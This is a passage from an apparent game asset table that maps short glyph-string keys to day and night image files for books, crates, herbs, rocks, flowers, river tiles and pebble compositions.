			"ⲆⲆⵠⵠᐃⲆΔΔΔ": "img/day-book37.png",
			"ⲆᐃΔΔΔⲆᐃⲆⵠ": "img/night-book37.png",
			"ΔΔⵠΔⵠΔⲆ": "img/day-book38.png",
			"ΔΔⵠᐃΔⵠᐃ": "img/night-book38.png",
			"ᐃⵠⵠᐃΔΔⲆ": "img/day-book39.png",
			"ⵠΔᐃΔⲆᐃⵠ": "img/night-book39.png",
			"ᐃⵠᐃⲆΔᐃⲆ": "img/day-book40.png",
			"ᐃⵠΔⵠΔⲆⵠ": "img/night-book40.png",
			"ⵠᐃⵠⲆⲆⵠⵠ": "img/day-book41.png",
			"ⵠᐃⵠⲆΔⲆⲆ": "img/night-book41.png",
			"ΔΔⲆᐃⵠΔⵠ": "img/day-book42.png",
			"ⲆΔⲆᐃⲆⵠⲆ": "img/night-book42.png",
			"ⲆΔⵠⵠᐃᐃΔ": "img/day-book43.png",
			"ΔΔᐃⲆⵠᐃⲆ": "img/night-book43.png",
			"ⲆⵠᐃᐃᐃΔⵠ": "img/day-book44.png",
			"ⲆⲆᐃᐃⵠⵠᐃ": "img/night-book44.png",
			"ⵠᐃⲆⲆⵠΔᐃ": "img/day-book45.png",
			"ᐃⵠⵠΔΔⲆⵠ": "img/night-book45.png",
			"ⵠᐃⵠⵠⲆᐃⵠ": "img/day-book46.png",
			"ⲆⵠΔΔΔⵠⲆ": "img/night-book46.png",
			"ⵠᐃⲆⲆⵠⵠΔ": "img/day-book47.png",
			"ⲆⲆΔᐃⵠᐃⵠ": "img/night-book47.png",
			"ᐃⵠⲆᐃⵠᐃⵠ": "img/day-book48.png",
			"ⵠΔⲆⲆⲆᐃᐃ": "img/night-book48.png",
			"ⵠᐃⵠⲆⲆⲆΔ": "img/day-book49.png",
			"ᐃᐃᐃⵠⲆΔᐃ": "img/night-book49.png",
			"ⲆΔⲆⲆΔΔΔ": "img/day-book50.png",
			"ⵠΔΔΔΔᐃᐃ": "img/night-book50.png",
			"ᐃⵠⵠⵠᐃΔⲆ": "img/day-crate1.png",
			"ᐃᐃΔⲆⵠΔⵠ": "img/night-crate1.png",
			"ⵠΔⵠⲆΔⲆΔ": "img/day-crate2.png",
			"ᐃᐃⵠΔⲆᐃΔ": "img/night-crate2.png",
			"ΔⵠⲆᐃⵠΔⲆ": "img/day-crate3.png",
			"ⲆⵠⲆΔᐃⲆᐃ": "img/night-crate3.png",
			"ⵠᐃᐃⲆᐃᐃⲆ": "img/day-crate4.png",
			"ᐃⲆᐃⲆⵠⲆⲆ": "img/night-crate4.png",
			"ⲆⲆⵠⵠⵠΔⵠ": "img/day-crate5.png",
			"ΔⵠⲆΔⵠᐃⵠ": "img/night-crate5.png",
			"ΔᐃᐃⲆΔᐃᐃ": "img/day-crate6.png",
			"ᐃⲆⵠᐃⲆⵠⵠ": "img/night-crate6.png",
			"ⲆⲆᐃⵠΔᐃⵠ": "img/day-crate7.png",
			"ⵠΔⵠⵠⵠⲆⲆ": "img/night-crate7.png",
			"ΔⲆΔⲆΔᐃⲆ": "img/day-crate8.png",
			"ⵠⵠΔⵠΔⵠᐃ": "img/night-crate8.png",
			"ᐃΔⲆⲆΔΔΔ": "img/day-crate9.png",
			"ΔᐃᐃᐃΔⲆⵠ": "img/night-crate9.png",
			"ⵠⵠΔᐃᐃΔⵠ": "img/day-crate10.png",
			"ⲆⵠᐃⲆⵠⲆⲆ": "img/night-crate10.png",
			"ⵠᐃᐃⵠΔΔΔ": "img/day-crate11.png",
			"ⲆⲆⲆΔᐃⵠⲆ": "img/night-crate11.png",
			"ΔᐃᐃᐃᐃΔΔ": "img/day-crate12.png",
			"ᐃᐃⲆΔⵠΔⲆ": "img/night-crate12.png",
			"ⵠⲆᐃᐃⵠⲆⵠ": "img/day-crate13.png",
			"ⲆᐃΔᐃΔⵠΔ": "img/night-crate13.png",
			"ΔΔⲆᐃΔⲆⲆ": "img/day-crate14.png",
			"ΔΔⵠⵠΔⵠᐃ": "img/night-crate14.png",
			"ΔΔΔⵠⲆΔⵠ": "img/day-crate15.png",
			"ΔⲆⲆᐃᐃⲆⵠ": "img/night-crate15.png",
			"ⲆⲆΔⲆΔΔΔ": "img/day-crate16.png",
			"ⵠΔᐃΔⲆᐃⲆ": "img/night-crate16.png",
			"ΔⲆⲆⲆᐃⵠⲆ": "img/day-crate17.png",
			"ⵠⵠΔᐃⵠΔⵠ": "img/night-crate17.png",
			"ⲆⵠᐃΔΔⵠⵠ": "img/day-crate18.png",
			"ⲆⵠⲆᐃᐃΔᐃ": "img/night-crate18.png",
			"ⲆᐃⵠⵠΔⲆΔ": "img/day-crate19.png",
			"ⵠΔⵠᐃⲆⵠⲆ": "img/night-crate19.png",
			"ΔΔΔᐃΔⲆⲆ": "img/day-crate20.png",
			"ᐃᐃΔⲆᐃΔⵠ": "img/night-crate20.png",
			"ⲆⵠᐃⲆⵠⵠⵠ": "img/day-crate21.png",
			"ᐃΔⵠΔΔⵠᐃ": "img/night-crate21.png",
			"ᐃⵠᐃⵠⵠⵠᐃ": "img/day-crate22.png",
			"ᐃᐃΔⵠΔᐃΔ": "img/night-crate22.png",
			"ᐃⵠΔⵠᐃⵠᐃ": "img/day-crate23.png",
			"ⲆΔᐃΔⲆⲆⲆ": "img/night-crate23.png",
			"ΔΔⲆᐃᐃΔᐃ": "img/day-crate24.png",
			"ΔⵠᐃΔᐃᐃⲆ": "img/night-crate24.png",
			"ΔⲆᐃᐃⲆᐃⵠ": "img/day-crate25.png",
			"ΔᐃᐃΔΔⲆⵠ": "img/night-crate25.png",
			"ⵠⵠΔΔⲆⵠⵠ": "img/day-crate26.png",
			"ᐃⲆᐃΔⲆⲆᐃ": "img/night-crate26.png",
			"ᐃΔⲆΔⵠⲆΔ": "img/day-crate27.png",
			"ᐃⲆⵠⵠΔⲆⲆ": "img/night-crate27.png",
			"ⲆΔⲆⵠᐃᐃⲆ": "img/day-crate28.png",
			"ΔⵠⲆⵠΔᐃⵠ": "img/night-crate28.png",
			"ᐃⲆΔΔⲆⵠⲆ": "img/day-crate29.png",
			"ⲆⵠⵠⵠⲆⵠⲆ": "img/night-crate29.png",
			"ⲆΔⲆⲆⲆⲆᐃ": "img/day-crate30.png",
			"ⲆⵠⵠⲆⵠⵠᐃ": "img/night-crate30.png",
			"ΔᐃⵠⵠⵠⵠⲆ": "img/day-crate31.png",
			"ᐃᐃⲆᐃΔᐃⵠ": "img/night-crate31.png",
			"ᐃⵠΔΔⲆΔΔ": "img/day-crate32.png",
			"ΔΔⵠⲆⵠⲆⵠ": "img/night-crate32.png",
			"ⲆΔⲆΔΔⲆⵠ": "img/day-crate33.png",
			"ⲆΔᐃᐃⵠⲆⲆ": "img/night-crate33.png",
			"ᐃΔᐃΔⲆⵠᐃ": "img/day-crate34.png",
			"ⲆⲆⲆΔΔᐃᐃ": "img/night-crate34.png",
			"ᐃⵠᐃⵠΔⲆᐃ": "img/day-crate35.png",
			"ⲆᐃΔΔΔⲆΔ": "img/night-crate35.png",
			"ⵠᐃⵠᐃⵠΔⵠ": "img/day-crate36.png",
			"ΔᐃΔᐃⲆⲆⲆ": "img/night-crate36.png",
			"ⵠΔᐃⲆⵠᐃΔ": "img/day-crate37.png",
			"ⵠⵠᐃⲆᐃΔᐃ": "img/night-crate37.png",
			"ΔⲆⵠᐃᐃⵠⲆ": "img/day-crate38.png",
			"ⲆᐃⲆΔΔⲆᐃ": "img/night-crate38.png",
			"ⵠᐃⲆⲆΔΔⲆ": "img/day-crate39.png",
			"ⵠⵠⲆⲆᐃⲆᐃ": "img/night-crate39.png",
			"ΔⲆⵠⲆⵠⲆⲆ": "img/day-crate40.png",
			"ᐃⵠⵠⵠΔᐃΔ": "img/night-crate40.png",
			"ⲆⵠᐃⲆⵠⵠⲆ": "img/day-crate41.png",
			"ⵠⲆⲆΔΔⵠⲆ": "img/night-crate41.png",
			"ΔⵠⲆⵠΔⲆⲆ": "img/day-crate42.png",
			"Ⲇⵠⵠᐃⵠᐃᐃ": "img/night-crate42.png",
			"ⲆᐃΔⲆΔᐃⲆ": "img/day-crate43.png",
			"ΔᐃⲆⲆᐃΔⵠ": "img/night-crate43.png",
			"ᐃⵠⲆᐃⵠΔⵠ": "img/day-crate44.png",
			"ⲆᐃⲆΔᐃΔΔ": "img/night-crate44.png",
			"ⵠⵠΔⵠΔⵠⵠ": "img/day-crate45.png",
			"ᐃⲆᐃⲆⵠΔⵠ": "img/night-crate45.png",
			"ⵠⲆⵠⲆΔΔⵠ": "img/day-crate46.png",
			"ΔⲆⲆᐃΔⲆΔ": "img/night-crate46.png",
			"ᐃⵠⲆⲆⲆΔⵠ": "img/day-crate47.png",
			"ΔⲆΔΔΔᐃᐃ": "img/night-crate47.png",
			"ᐃⵠⲆΔⵠⲆΔ": "img/day-crate48.png",
			"ⵠΔΔⲆⲆⵠᐃ": "img/night-crate48.png",
			"ⵠΔᐃⲆⵠᐃⵠ": "img/day-crate49.png",
			"ⵠⵠΔΔΔΔΔ": "img/night-crate49.png",
			"ΔᐃⲆⲆᐃΔᐃ": "img/day-crate50.png",
			"ᐃⵠᐃᐃᐃᐃᐃ": "img/night-crate50.png",
			"ⲆⲆⲆⵠⵠⲆⲆ": "img/day-crate51.png",
			"ᐃⲆⲆⲆᐃΔᐃ": "img/night-crate51.png",
			"ⲆⵠⲆᐃⲆⲆⵠ": "img/day-crate52.png",
			"ⲆᐃΔᐃⲆⲆⵠ": "img/night-crate52.png",
			"ΔⲆⲆⲆⵠᐃⵠ": "img/day-crate53.png",
			"ΔⵠΔⲆⵠⵠⲆ": "img/night-crate53.png",
			"ⲆⲆΔΔⵠⲆᐃ": "img/day-crate54.png",
			"ᐃᐃⵠⵠᐃΔⲆ": "img/night-crate54.png",
			"ⵠⵠΔⲆᐃΔⲆ": "img/day-crate55.png",
			"ⲆⵠᐃᐃⲆᐃΔ": "img/night-crate55.png",
			"ΔΔⲆᐃⲆⲆⵠ": "img/day-crate56.png",
			"ᐃⵠⲆᐃΔⲆⵠ": "img/night-crate56.png",
			"ᐃⵠΔᐃⵠΔⵠ": "img/day-crate57.png",
			"ᐃⵠᐃΔΔⵠᐃ": "img/night-crate57.png",
			"ΔΔΔⲆⲆⲆⵠ": "img/day-crate58.png",
			"ΔᐃⲆⲆⲆΔΔ": "img/night-crate58.png",
			"ⲆⵠΔⲆⵠᐃⲆ": "img/day-crate59.png",
			"ⵠⲆⲆᐃⲆΔⵠ": "img/night-crate59.png",
			"ⵠⲆΔⲆΔⵠⲆ": "img/day-crate60.png",
			"ⲆᐃΔΔⲆᐃⲆ": "img/night-crate60.png",
			"ΔⵠⵠΔΔΔΔ": "img/day-crate61.png",
			"ⲆⵠᐃᐃᐃⲆᐃ": "img/night-crate61.png",
			"ⲆⵠΔΔᐃΔⲆ": "img/day-crate62.png",
			"ⵠΔⵠᐃᐃⲆⲆ": "img/night-crate62.png",
			"ⲆⲆΔⵠΔΔᐃ": "img/day-crate63.png",
			"ΔΔᐃΔΔⵠⵠ": "img/night-crate63.png",
			"ᐃΔⲆᐃⵠᐃᐃ": "img/day-crate64.png",
			"ⵠⲆΔΔⵠⲆΔ": "img/night-crate64.png",
			"ⵠⲆⲆⲆΔⲆⲆ": "img/day-crate65.png",
			"ΔΔⲆᐃⵠᐃᐃ": "img/night-crate65.png",
			"ⲆΔᐃᐃΔⵠⵠ": "img/day-crate66.png",
			"ᐃⵠΔΔⵠⲆᐃ": "img/night-crate66.png",
			"ᐃⲆᐃⵠⵠⵠᐃ": "img/day-crate67.png",
			"ᐃΔΔΔᐃΔᐃ": "img/night-crate67.png",
			"ᐃⵠΔⵠⲆΔΔ": "img/day-crate68.png",
			"ⵠΔⲆⵠΔΔⲆ": "img/night-crate68.png",
			"ⲆⲆΔᐃⲆⲆᐃ": "img/day-crate69.png",
			"ⲆⲆᐃⵠΔⵠΔ": "img/night-crate69.png",
			"ΔⵠⵠᐃΔⲆⲆ": "img/day-crate70.png",
			"ΔⲆⵠᐃᐃⲆⵠ": "img/night-crate70.png",
			"ᐃⲆΔⲆᐃΔⵠ": "img/day-crate71.png",
			"ⲆΔⵠΔΔⵠᐃ": "img/night-crate71.png",
			"ΔⵠΔΔⵠⵠⲆ": "img/day-crate72.png",
			"ⲆⲆⲆⵠⵠⵠᐃ": "img/night-crate72.png",
			"ΔᐃᐃⲆᐃⵠⵠ": "img/day-crate73.png",
			"ᐃᐃⲆᐃᐃᐃΔ": "img/night-crate73.png",
			"ⵠⵠΔΔⵠⵠⲆ": "img/day-crate74.png",
			"ⵠΔᐃᐃⲆᐃΔ": "img/night-crate74.png",
			"ᐃⲆⵠΔⵠⲆᐃ": "img/day-crate75.png",
			"ᐃⵠⲆⲆΔᐃⲆ": "img/night-crate75.png",
			"ⵠⵠⵠⵠⲆᐃⲆ": "img/day-crate76.png",
			"ⵠⲆΔⲆᐃⲆⲆ": "img/night-crate76.png",
			"ⵠⵠΔᐃᐃᐃⲆ": "img/day-crate77.png",
			"ⲆⲆᐃᐃⲆⲆΔ": "img/night-crate77.png",
			"ⵠᐃⵠΔⲆᐃΔ": "img/day-crate78.png",
			"ᐃⲆᐃⵠⵠΔᐃ": "img/night-crate78.png",
			"ΔᐃᐃᐃⵠΔⲆ": "img/day-crate79.png",
			"ΔΔⵠⵠΔⲆⵠ": "img/night-crate79.png",
			"ᐃΔⵠⵠⲆΔⵠ": "img/day-herb0.png",
			"ΔⵠⲆΔⲆⲆΔ": "img/day-herb1.png",
			"ⲆΔᐃΔᐃⲆⲆ": "img/day-herb2.png",
			"ⲆⵠᐃⵠᐃᐃΔ": "img/day-herb3.png",
			"ⲆᐃⲆⲆΔⲆᐃ": "img/day-herb4.png",
			"ⵠⲆᐃΔⵠⲆΔ": "img/day-herb5.png",
			"ΔΔⲆⵠⵠⲆΔ": "img/day-herb6.png",
			"ⵠⲆᐃΔΔⲆⵠ": "img/day-herb7.png",
			"ᐃᐃΔⲆᐃΔᐃ": "img/day-herb8.png",
			"ⲆΔᐃΔⵠΔⵠ": "img/day-herb9.png",
			"ⲆⵠⲆⲆᐃᐃᐃ": "img/day-herb10.png",
			"ΔᐃᐃᐃⲆⵠⵠ": "img/day-herb11.png",
			"ᐃᐃⵠⵠⲆΔᐃ": "img/day-herb12.png",
			"ⵠᐃΔⵠⵠⵠⵠ": "img/day-herb13.png",
			"ΔΔⵠⵠᐃᐃⵠ": "img/day-herb14.png",
			"ᐃⵠᐃΔΔᐃⲆ": "img/day-herb15.png",
			"ⵠᐃⲆⲆⵠᐃΔ": "img/day-shell0.png",
			"ⵠⲆΔΔⲆⲆⲆ": "img/day-shell1.png",
			"ⵠᐃΔⲆᐃᐃⲆ": "img/day-shell2.png",
			"ⲆᐃⵠᐃΔⵠᐃ": "img/day-leaf1.png",
			"ⵠⲆⲆⵠΔᐃΔ": "img/day-leaf2.png",
			"ΔᐃⲆⵠⵠΔⲆ": "img/day-leaf3.png",
			"ΔⵠΔⵠΔᐃⵠ": "img/day-leaf4.png",
			"ⲆⲆᐃᐃⵠᐃΔ": "img/day-leaf5.png",
			"ᐃⵠΔΔⲆⲆΔ": "img/day-leaf6.png",
			"Ⲇᐃᐃⵠⵠᐃᐃ": "img/day-leaf7.png",
			"ΔⵠⲆΔⵠᐃⲆ": "img/day-leaf8.png",
			"ᐃΔⲆΔⲆΔΔ": "img/day-rock0.png",
			"ΔⵠⲆΔᐃⲆⵠ": "img/day-rock1.png",
			"ⲆⵠΔⵠΔΔⲆ": "img/day-rock2.png",
			"ⵠΔᐃᐃⲆΔⲆ": "img/day-rock3.png",
			"ᐃΔⲆⲆᐃⲆᐃ": "img/day-rock4.png",
			"ΔΔΔᐃΔᐃΔ": "img/day-rock5.png",
			"ᐃᐃⵠΔᐃⲆΔ": "img/day-rock6.png",
			"ᐃⲆᐃⲆΔⵠΔ": "img/day-rock7.png",
			"ⲆⲆⲆΔᐃΔⵠ": "img/day-rock8.png",
			"ⲆⲆⵠᐃᐃΔΔ": "img/day-rock9.png",
			"ᐃⲆⵠᐃⵠⵠⵠ": "img/day-rock10.png",
			"ⲆⲆΔΔΔᐃⵠ": "img/day-rock11.png",
			"ⲆⵠⲆⵠᐃΔᐃ": "img/day-rock12.png",
			"ᐃⵠᐃⲆⵠΔΔ": "img/day-rock13.png",
			"ΔⲆⵠⵠⲆⵠⲆ": "img/day-flower1.png",
			"ⲆⲆᐃᐃᐃᐃᐃ": "img/day-flower2.png",
			"ⲆⵠᐃⵠⲆᐃΔ": "img/day-flower3.png",
			"ᐃᐃᐃΔᐃⲆᐃ": "img/day-flower4.png",
			"ⵠⵠΔⵠⲆⵠⲆ": "img/day-flower5.png",
			"ⲆΔⵠΔⵠᐃⲆ": "img/day-flower6.png",
			"ΔᐃⵠⵠᐃⵠΔ": "img/day-flower7.png",
			"ⵠⵠⲆⲆⲆⵠᐃ": "img/day-flower8.png",
			"ⵠⲆΔⵠⵠΔΔ": "img/day-flower9.png",
			"ⵠᐃⲆⵠΔΔⲆ": "img/day-herb16.png",
			"ⲆᐃᐃΔᐃⲆΔ": "img/day-herb17.png",
			"ᐃⵠⲆⵠⵠᐃⲆ": "img/day-herb18.png",
			"ⲆᐃⵠΔⲆᐃⲆ": "img/day-herb19.png",
			"ⲆⵠΔᐃⵠⵠⲆ": "img/day-herb20.png",
			"ΔΔΔⵠⲆⲆⵠ": "img/day-herb21.png",
			"ΔΔⵠΔᐃΔΔ": "img/night-herb0.png",
			"ΔⵠᐃⲆᐃΔΔ": "img/night-herb1.png",
			"ⲆΔΔⵠⵠᐃⵠ": "img/night-herb2.png",
			"ⲆⲆΔᐃᐃΔⲆ": "img/night-herb3.png",
			"ΔⲆⵠⲆⵠΔΔ": "img/night-herb4.png",
			"ΔΔᐃᐃⲆΔⵠ": "img/night-herb5.png",
			"ΔΔⵠⲆᐃᐃⵠ": "img/night-herb6.png",
			"ΔⲆΔΔⲆᐃⵠ": "img/night-herb7.png",
			"ⵠᐃᐃᐃΔⵠⵠ": "img/night-herb8.png",
			"ΔⲆΔᐃⲆᐃⵠ": "img/night-herb9.png",
			"ⲆᐃⲆᐃⲆⲆⲆ": "img/night-herb10.png",
			"Δᐃⵠᐃⵠᐃᐃ": "img/night-herb11.png",
			"ΔΔⲆⲆⵠᐃᐃ": "img/night-herb12.png",
			"ΔⲆⲆⵠⵠⵠΔ": "img/night-herb13.png",
			"ᐃᐃᐃΔⵠⵠⵠ": "img/night-herb14.png",
			"ᐃΔᐃᐃΔᐃⲆ": "img/night-herb15.png",
			"ⲆⵠⲆⵠΔΔᐃ": "img/night-shell0.png",
			"ⵠⲆⵠⵠⵠⵠΔ": "img/night-shell1.png",
			"ⲆⲆⵠⵠⵠᐃⲆ": "img/night-shell2.png",
			"ΔⵠᐃⲆᐃᐃΔ": "img/night-leaf1.png",
			"ΔΔⲆⵠⲆᐃⲆ": "img/night-leaf2.png",
			"ΔⲆⲆᐃΔⲆⵠ": "img/night-leaf3.png",
			"ⵠⵠᐃⲆΔᐃⲆ": "img/night-leaf4.png",
			"ⵠⵠⵠᐃⲆᐃΔ": "img/night-leaf5.png",
			"ⵠᐃⵠⲆⲆᐃᐃ": "img/night-leaf6.png",
			"ⲆⲆᐃᐃΔⵠⲆ": "img/night-leaf7.png",
			"ⲆᐃⵠⲆΔⵠⲆ": "img/night-leaf8.png",
			"ⲆⲆⲆΔᐃⵠᐃ": "img/night-rock0.png",
			"ⵠⲆᐃⲆⲆᐃᐃ": "img/night-rock1.png",
			"ⵠᐃⲆⵠᐃⵠⲆ": "img/night-rock2.png",
			"ⵠⲆᐃᐃⲆᐃΔ": "img/night-rock3.png",
			"ᐃΔΔⵠⲆⲆᐃ": "img/night-rock4.png",
			"ᐃⲆⵠᐃⲆᐃᐃ": "img/night-rock5.png",
			"ⲆⵠⵠΔⲆΔⵠ": "img/night-rock6.png",
			"ΔᐃⵠΔᐃⵠΔ": "img/night-rock7.png",
			"ᐃⵠⵠⲆᐃⲆᐃ": "img/night-rock8.png",
			"ΔⵠⲆᐃᐃᐃⲆ": "img/night-rock9.png",
			"ⵠᐃΔⵠⲆΔᐃ": "img/night-rock10.png",
			"ΔⲆⲆΔⵠᐃⲆ": "img/night-rock11.png",
			"ΔΔΔΔⵠΔⵠ": "img/night-rock12.png",
			"ᐃΔᐃΔΔᐃᐃ": "img/night-rock13.png",
			"ᐃⵠᐃΔΔΔᐃ": "img/night-flower1.png",
			"ⵠⲆⵠⲆΔᐃΔ": "img/night-flower2.png",
			"ΔⵠⵠⵠΔⵠᐃ": "img/night-flower3.png",
			"ΔⲆⵠⵠΔⵠⵠ": "img/night-flower4.png",
			"ⲆΔⵠⵠⲆΔΔ": "img/night-flower5.png",
			"ⵠᐃᐃΔⵠᐃⵠ": "img/night-flower6.png",
			"ΔⵠᐃⲆΔᐃᐃ": "img/night-flower7.png",
			"ᐃΔⲆᐃΔⲆΔ": "img/night-flower8.png",
			"ᐃⲆⲆⲆⲆᐃᐃ": "img/night-flower9.png",
			"ⵠᐃⲆΔΔΔⲆ": "img/night-herb16.png",
			"ᐃᐃᐃᐃⵠΔΔ": "img/night-herb17.png",
			"ⲆᐃⲆΔᐃⵠⲆ": "img/night-herb18.png",
			"ᐃΔⲆⲆᐃⵠᐃ": "img/night-herb19.png",
			"ΔⲆⲆⲆⵠⵠᐃ": "img/night-herb20.png",
			"ⵠᐃΔᐃΔᐃΔ": "img/night-herb21.png",
			"ⵠΔᐃⲆⲆⵠΔ": "img/day-river000-010-000.png",
			"ᐃⵠⵠΔᐃⲆΔ": "img/day-river000-010-010.png",
			"ⲆΔⵠⵠΔᐃᐃ": "img/day-river000-011-000.png",
			"ᐃⵠⲆⵠᐃⲆᐃ": "img/day-river000-011-010.png",
			"ΔᐃᐃΔⲆΔⵠ": "img/day-river000-011-011.png",
			"ⵠᐃⵠᐃᐃⵠⵠ": "img/day-river000-110-000.png",
			"ⲆⲆⵠⵠⲆΔⵠ": "img/day-river000-110-010.png",
			"ᐃΔⲆᐃᐃⵠᐃ": "img/day-river000-110-110.png",
			"ⵠⵠⲆⵠⲆΔⵠ": "img/day-river000-111-000.png",
			"ΔΔⲆᐃΔⵠⵠ": "img/day-river000-111-010.png",
			"ⲆᐃᐃⲆΔⲆⵠ": "img/day-river000-111-011.png",
			"ΔᐃⲆᐃⵠᐃⵠ": "img/day-river000-111-110.png",
			"ᐃⵠᐃⵠⲆⵠᐃ": "img/day-river000-111-111.png",
			"ⲆⵠᐃⲆⵠⲆΔ": "img/day-river010-010-000.png",
			"ᐃᐃⲆⲆᐃⵠⵠ": "img/day-river010-010-010.png",
			"ⲆⲆⲆᐃⲆⵠΔ": "img/day-river010-011-000.png",
			"ⵠⵠᐃᐃᐃⲆΔ": "img/day-river010-011-010.png",
			"ⵠΔⵠΔᐃⲆⲆ": "img/day-river010-011-011.png",
			"ⵠΔⲆΔΔⲆⵠ": "img/day-river010-110-000.png",
			"ⵠᐃⵠΔᐃⵠᐃ": "img/day-river010-110-010.png",
			"ⲆⲆⵠΔⲆⲆⲆ": "img/day-river010-110-110.png",
			"ᐃⵠⲆⲆⲆᐃⲆ": "img/day-river010-111-000.png",
			"ΔᐃⵠΔᐃΔᐃ": "img/day-river010-111-010.png",
			"ⲆΔᐃΔᐃⵠⵠ": "img/day-river010-111-011.png",
			"ᐃⲆⵠΔⵠΔᐃ": "img/day-river010-111-110.png",
			"ⲆᐃᐃⲆⲆⲆⲆ": "img/day-river010-111-111.png",
			"ⲆᐃᐃᐃⲆⵠΔ": "img/day-river011-011-000.png",
			"ⲆⲆⲆⵠⵠᐃΔ": "img/day-river011-011-010.png",
			"ⵠΔᐃⵠΔⵠᐃ": "img/day-river011-011-011.png",
			"ΔΔⵠⵠⲆⵠⲆ": "img/day-river011-111-000.png",
			"ᐃᐃΔΔⵠᐃⵠ": "img/day-river011-111-010.png",
			"ⲆᐃⲆᐃⵠⵠΔ": "img/day-river011-111-011.png",
			"ⲆᐃⵠᐃⵠΔⵠ": "img/day-river011-111-110.png",
			"ᐃᐃΔᐃⵠⲆⲆ": "img/day-river011-111-111.png",
			"ᐃⲆⵠΔΔⵠᐃ": "img/day-river110-110-000.png",
			"ΔᐃᐃⵠΔⵠᐃ": "img/day-river110-110-010.png",
			"ⵠᐃᐃᐃⲆΔⲆ": "img/day-river110-110-110.png",
			"ⵠⵠᐃⲆΔⲆΔ": "img/day-river110-111-000.png",
			"ⲆᐃⵠⲆⵠⲆⲆ": "img/day-river110-111-010.png",
			"ᐃⲆⵠⵠⲆΔᐃ": "img/day-river110-111-011.png",
			"ⵠᐃΔᐃⵠΔΔ": "img/day-river110-111-110.png",
			"ⲆΔⲆΔᐃⲆⲆ": "img/day-river110-111-111.png",
			"ᐃΔᐃᐃⵠΔΔ": "img/day-river111-111-011.png",
			"ⲆᐃΔⵠⲆⵠΔ": "img/day-river111-111-110.png",
			"ᐃΔᐃᐃⵠΔΔ": "img/day-river111-111-011.png",
			"ⲆⲆⵠⵠⵠⲆᐃ": "img/day-river111-111-000.png",
			"ΔΔⲆⲆᐃⲆΔ": "img/day-river111-111-111.png",
			"ᐃΔΔΔᐃΔⲆ": "img/day-river111-111-010.png",
			"ⲆⲆⵠᐃⵠⲆⲆ": "img/night-river000-010-000.png",
			"ΔᐃⲆᐃⲆᐃⵠ": "img/night-river000-010-010.png",
			"ⵠⲆⲆⲆᐃⲆΔ": "img/night-river000-011-000.png",
			"ⲆᐃᐃⵠᐃⲆⲆ": "img/night-river000-011-010.png",
			"ᐃΔⵠΔᐃⲆᐃ": "img/night-river000-011-011.png",
			"ⵠⵠᐃⵠⲆⲆⲆ": "img/night-river000-110-000.png",
			"ⲆⵠⲆᐃΔᐃⲆ": "img/night-river000-110-010.png",
			"ΔᐃⲆᐃⲆΔⲆ": "img/night-river000-110-110.png",
			"ⲆⲆⲆⵠⲆᐃⲆ": "img/night-river000-111-000.png",
			"ΔᐃᐃΔᐃⵠᐃ": "img/night-river000-111-010.png",
			"ⲆⵠᐃᐃΔΔⲆ": "img/night-river000-111-011.png",
			"ⵠⵠᐃᐃᐃⲆⵠ": "img/night-river000-111-110.png",
			"ⵠⵠⲆⲆⲆⲆⲆ": "img/night-river000-111-111.png",
			"ᐃΔᐃⲆⲆⵠⲆ": "img/night-river010-010-000.png",
			"ᐃⲆᐃΔⲆⵠⲆ": "img/night-river010-010-010.png",
			"ⲆⵠᐃⲆⵠᐃⵠ": "img/night-river010-011-000.png",
			"ᐃᐃΔⲆⵠⲆⵠ": "img/night-river010-011-010.png",
			"ΔΔⲆⵠΔΔΔ": "img/night-river010-011-011.png",
			"ΔᐃⲆΔⲆⵠᐃ": "img/night-river010-110-000.png",
			"ⲆⵠⵠⲆΔΔΔ": "img/night-river010-110-010.png",
			"ᐃⲆⲆᐃⵠⲆⵠ": "img/night-river010-110-110.png",
			"ᐃⵠᐃⲆᐃⵠⵠ": "img/night-river010-111-000.png",
			"ΔΔΔᐃᐃΔᐃ": "img/night-river010-111-010.png",
			"ⲆᐃᐃⵠⲆΔΔ": "img/night-river010-111-011.png",
			"ΔⵠⵠⲆᐃⲆΔ": "img/night-river010-111-110.png",
			"ᐃᐃᐃⲆⲆⲆΔ": "img/night-river010-111-111.png",
			"ⵠⲆᐃⵠⵠⵠΔ": "img/night-river011-011-000.png",
			"ΔⲆⲆᐃΔᐃⵠ": "img/night-river011-011-010.png",
			"ⵠⵠᐃΔⲆΔⲆ": "img/night-river011-011-011.png",
			"ᐃⲆⲆⲆᐃᐃⲆ": "img/night-river011-111-000.png",
			"ⵠⵠⲆⵠⲆⲆᐃ": "img/night-river011-111-010.png",
			"ᐃᐃΔⵠΔΔⲆ": "img/night-river011-111-011.png",
			"ⵠΔᐃⲆᐃⵠΔ": "img/night-river011-111-110.png",
			"ᐃⵠΔⵠΔⲆΔ": "img/night-river011-111-111.png",
			"ΔᐃⲆᐃΔⲆᐃ": "img/night-river110-110-000.png",
			"ⵠΔΔᐃⵠΔΔ": "img/night-river110-110-010.png",
			"ⲆᐃⲆᐃᐃΔⵠ": "img/night-river110-110-110.png",
			"ΔⵠᐃⵠΔⲆΔ": "img/night-river110-111-000.png",
			"ⲆⲆΔᐃΔᐃᐃ": "img/night-river110-111-010.png",
			"ⵠᐃΔⵠΔⵠⵠ": "img/night-river110-111-011.png",
			"ⵠΔⲆΔΔⵠΔ": "img/night-river110-111-110.png",
			"ⲆᐃⵠⵠᐃΔᐃ": "img/night-river110-111-111.png",
			"ΔΔⵠΔΔⲆᐃ": "img/night-river111-111-011.png",
			"ⵠⵠΔⵠⵠᐃᐃ": "img/night-river111-111-110.png",
			"ΔΔⵠΔΔⲆᐃ": "img/night-river111-111-011.png",
			"ⲆⵠⲆΔⲆⵠΔ": "img/night-river111-111-000.png",
			"Ⲇᐃⵠⵠᐃⵠᐃ": "img/night-river111-111-111.png",
			"ⵠⲆΔⵠΔⲆⵠ": "img/night-river111-111-010.png",
			"ΔⲆΔⲆΔⵠΔ": "img/day-pebblecompo1.png",
			"ⲆⲆΔⵠΔ": "img/day-pebblecompo2.png",
			"ⲆⵠᐃⲆΔ": "img/day-pebblecompo3.png",
			"ΔᐃᐃⲆᐃⲆⲆ": "img/day-pebblecompo4.png",
			"ΔⲆᐃΔᐃ": "img/day-pebblecompo5.png",
			"ⵠᐃΔⵠⵠ": "img/day-pebblecompo6.png",
			"ᐃⵠⵠᐃⲆ": "img/day-pebblecompo7.png",
			"ⲆᐃΔⲆᐃΔΔ": "img/day-pebblecompo8.png",
			"ᐃⲆΔΔⵠΔⲆ": "img/day-pebblecompo9.png",
			"ⵠᐃΔⲆⲆⲆⵠ": "img/day-pebblecompo10.png",
			"ΔⵠⵠᐃⲆ": "img/day-pebblecompo11.png",
